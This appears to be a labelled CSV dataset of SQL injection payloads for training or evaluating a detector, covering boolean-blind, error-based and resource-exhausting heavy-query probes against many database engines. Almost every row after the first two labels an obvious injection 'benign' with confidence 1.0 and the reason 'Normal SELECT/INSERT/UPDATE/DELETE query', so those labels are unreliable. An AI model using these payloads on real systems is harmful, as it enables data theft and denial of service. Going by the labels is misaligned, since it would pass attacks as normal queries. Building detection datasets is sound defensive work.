payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1"" ) as advz where 5166 = 5166 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2070,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) as advz where 5166 = 5166 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1"" ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""fogb"" like ""fogb",error_based,oracle,0.85,ctxsys.drithsx for error extraction,KEEP,,error_based,oracle,2071,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1"" ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""fogb"" like ""fogb"
"1%"" or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2072,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%"" or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"1' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2073,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --"
select ( case when ( 1291 = 6612 ) then 1 else 1291* ( select 1291 from master..sysdatabases ) end ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2074,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,select ( case when ( 1291 = 6612 ) then 1 else 1291* ( select 1291 from master..sysdatabases ) end ) --
-2429%' or 6890 = 5846,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2075,boolean_blind,generic,Pattern match: 'or 6890 = 5846' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2429%' or 6890 = 5846
-4761 order by 1--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2076,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-4761 order by 1--
-2960' or 2163 = 3143--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2077,boolean_blind,generic,Pattern match: 'or 2163 = 3143' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2960' or 2163 = 3143--
1 ) where 4479 = 4479 rlike ( select ( case when ( 6351 = 4367 ) then 1 else 0x28 end ) ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2078,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 ) where 4479 = 4479 rlike ( select ( case when ( 6351 = 4367 ) then 1 else 0x28 end ) ) --
"select * from generate_series ( 2317,2317,case when ( 2317 = 9706 ) then 1 else 0 end ) limit 1--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2079,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal,"select * from generate_series ( 2317,2317,case when ( 2317 = 9706 ) then 1 else 0 end ) limit 1--"
"select * from generate_series ( 3427,3427,case when ( 3427 = 7516 ) then 1 else 0 end ) limit 1--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2080,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal,"select * from generate_series ( 3427,3427,case when ( 3427 = 7516 ) then 1 else 0 end ) limit 1--"
"1"" and elt ( 4249 = 4249,7259 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2081,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" and elt ( 4249 = 4249,7259 )"
"1' ) ) as ewyk where 4828 = 4828 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2082,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) as ewyk where 4828 = 4828 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --"
"select count ( * ) from generate_series ( 1,5000000 ) and ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2083,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ""%"" = """
"-8186%' or elt ( 1032 = 1032,3623 ) and '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2084,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-8186%' or elt ( 1032 = 1032,3623 ) and '%' = '"
select case when 7649 = 9297 then 1 else null end--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2085,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 7649 = 9297 then 1 else null end--
"-2872 ) where 8797 = 8797 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2086,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-2872 ) where 8797 = 8797 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
"1' ) where 1363 = 1363 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2087,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) where 1363 = 1363 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --"
"1'|| ( select 'jpow' from dual where 4381 = 4381 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2088,boolean_blind,oracle,Pattern match: 'elt (' → boolean_blind (P3); DB signature: oracle,heavy_query,oracle,contains 7+ digit number (DoS-style payload),"1'|| ( select 'jpow' from dual where 4381 = 4381 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'"
1 ) as tbve where 4828 = 4828,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2089,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as tbve where 4828 = 4828
1'+ ( select iwbs where 4939 = 4939,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2090,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select iwbs where 4939 = 4939
1' ) as fksm where 9714 = 9714,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2091,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as fksm where 9714 = 9714
1 ) as drgs where 1989 = 1989 order by 1--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2092,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as drgs where 1989 = 1989 order by 1--
"1' ) ) as kwre where 7775 = 7775 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2093,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1' ) ) as kwre where 7775 = 7775 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'qhgp' = 'qhgp",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2094,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'qhgp' = 'qhgp"
-1499 ) as gxfm where 9762 = 9762 or 5989 = 4782--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2095,boolean_blind,generic,Pattern match: 'or 5989 = 4782' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1499 ) as gxfm where 9762 = 9762 or 5989 = 4782--
"1"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2096,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2097,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )"
-4023 or ( 8779 = 5716 ) *5716,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2098,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-4023 or ( 8779 = 5716 ) *5716
1'|| ( select 'eyiy' from dual where 8127 = 8127,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2099,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'eyiy' from dual where 8127 = 8127
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'vfxg' like 'vfxg",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2100,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'vfxg' like 'vfxg"
"1%' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2101,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( '%' = '"
"1'+ ( select 'opqr' where 2442 = 2442 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2102,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1'+ ( select 'opqr' where 2442 = 2442 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2103,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) )"
"1'+ ( select 'ycsv' where 3628 = 3628 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2104,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1'+ ( select 'ycsv' where 3628 = 3628 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"1%"" ) and 7533 = 7533 and ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2105,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1%"" ) and 7533 = 7533 and ( ""%"" = """
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # lchh",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2106,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # lchh"
"1'|| ( select 'uusj' where 2149 = 2149 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2107,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1'|| ( select 'uusj' where 2149 = 2149 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'"
"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2108,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )"
"1' ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2109,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2110,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )"
1' ) ) as yqek where 1957 = 1957,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2111,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as yqek where 1957 = 1957
"1"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""fjwv"" like ""fjwv",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2112,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""fjwv"" like ""fjwv"
1 ) as hggi where 6511 = 6511,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2113,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as hggi where 6511 = 6511
"1' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'gxpr' = 'gxpr",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2114,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'gxpr' = 'gxpr"
"1' ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2115,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1' ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"1"" ) ) and make_set ( 8266 = 9226,9226 ) and ( ( ""omjx"" like ""omjx",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2116,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" ) ) and make_set ( 8266 = 9226,9226 ) and ( ( ""omjx"" like ""omjx"
select ( case when ( 5698 = 3453 ) then 5698 else 1/ ( select 0 ) end ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2117,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 5698 = 3453 ) then 5698 else 1/ ( select 0 ) end ) --
1 ) rlike ( select ( case when ( 5477 = 7492 ) then 1 else 0x28 end ) ) and ( 4427 = 4427,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2118,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 ) rlike ( select ( case when ( 5477 = 7492 ) then 1 else 0x28 end ) ) and ( 4427 = 4427
"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""sckh"" = ""sckh",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2119,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""sckh"" = ""sckh"
"1"" ) where 1607 = 1607",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2120,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 1607 = 1607"
"-4194"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""ddbc"" like ""ddbc",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2121,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"-4194"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""ddbc"" like ""ddbc"
"1 ) ) as rual where 4649 = 4649 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2122,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) as rual where 4649 = 4649 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --"
1'+ ( select 'czpg' where 6627 = 6627 and 2006 = 2006,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2123,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1'+ ( select 'czpg' where 6627 = 6627 and 2006 = 2006
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2124,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""%"" = """
-1564' ) order by 1--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2125,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-1564' ) order by 1--
"-7060' ) or make_set ( 4233 = 1689,1689 ) and ( 'twpr' like 'twpr",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2126,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-7060' ) or make_set ( 4233 = 1689,1689 ) and ( 'twpr' like 'twpr"
"1"" where 8333 = 8333",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2127,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 8333 = 8333"
if ( 6745 = 4078 ) select 6745 else drop function ytyt--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2128,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,if ( 6745 = 4078 ) select 6745 else drop function ytyt--
1%' and 1736 = 4220,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2129,boolean_blind,generic,Pattern match: 'and 1736 = 4220' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1%' and 1736 = 4220
